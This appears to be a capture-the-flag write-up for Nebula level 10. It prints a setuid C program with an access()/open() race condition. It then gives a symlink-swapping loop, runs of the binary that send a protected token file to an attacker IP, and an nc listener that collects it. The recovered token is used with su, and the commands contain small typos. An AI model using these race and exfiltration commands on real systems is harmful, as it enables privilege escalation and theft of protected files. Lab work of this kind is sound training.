# Level10

## Task

>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

>To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

## Solution

The binary first checks to see if the user running the problem has access to the file (line24)  It then assumes for the rest of the execution of the program, that we still have access to it. To trick this i do the following.

```
level10@nebula:/home/flag10$ while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; don

level10@nebula:/home/flag10$ while :; do nice -n 20 ./flag10 192.168.1.1;done
```

then on my attacker

```
{17-01-09 12:18}0cc7a14b8ffe:~ root# while :; do nc -l -p 18211 >> out.txt; done
{17-01-09 12:18}0cc7a14b8ffe:~ root# tail -f out.txt | grep -v ".oO Oo."
```

I found this to be a real challange, so its something i need to back and review, but it did work and i found the token

```
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```
then `su` to the flag user and get the flag

```
level10@nebula:/home/flag10$ su flag10
Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
